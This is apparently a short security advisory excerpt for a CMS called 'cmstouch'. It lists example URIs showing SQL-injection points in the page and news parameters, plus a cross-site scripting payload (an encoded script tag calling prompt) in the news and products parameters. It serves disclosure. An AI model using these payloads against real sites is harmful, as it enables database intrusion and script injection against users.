Attackers can use a browser to exploit the SQL-injection issues. An attacker must trick a victim into following a malicious URI to exploit cross-site scripting issues.

The following example URIs are available:

http://www.example.com/cmstouch/pages.php?Page_ID=SQL

http://www.example.com/cmstouch/news.php?do=show&amp;News_ID=SQL

http://www.example.com/cmstouch/news.php?do=show&amp;News_ID=18'%22()%26%25&lt;ScRiPt%20&gt;prompt(771818860)&lt;/ScRiPt&gt;

http://www.example.com/cmstouch/products.php?do=show&amp;Products_ID=5'%22()%26%25&lt;ScRiPt%20&gt;prompt(771818860)&lt;/ScRiPt&gt;
